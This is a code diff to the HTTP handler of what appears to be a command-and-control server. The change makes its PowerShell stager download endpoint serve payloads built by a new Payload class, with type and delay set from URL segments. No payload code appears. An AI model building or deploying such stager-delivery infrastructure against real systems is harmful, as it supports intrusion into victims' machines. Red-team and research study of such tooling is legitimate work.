@@ -15,7 +15,7 @@ from core.rc4 import RC4
 from core.parser import HTTPDParser
 from core.utils import Utils
 from core.apis import ServerApi
-
+from core.payload import Payload
 def HTTPDFactory(config):
 
     class HTTPD(BaseHTTPServer.BaseHTTPRequestHandler, object):
@@ -104,7 +104,15 @@ def HTTPDFactory(config):
             payload_path = self.path.split("/")
             if payload_path[1] == self.config.get("http-download-path"):
                 Log.log_event("Download Stager", "PowerShell stager was fetched from %s (%s)" % (self.client_address[0], self.address_string()))
-                self.output = Utils.load_powershell_script("stager.ps1", 56)
+		payload = Payload(self.config)
+
+		if len(payload_path) > 3:
+			payload.set_type(payload_path[2])
+
+		if len(payload_path) > 4:
+			payload.set_delay(payload_path[3])
+		self.output = payload.get_output()
+
             elif path in Utils.get_download_folder_content():
                 force_download = True
                 self.output = Utils.load_file("download/%s" % path)
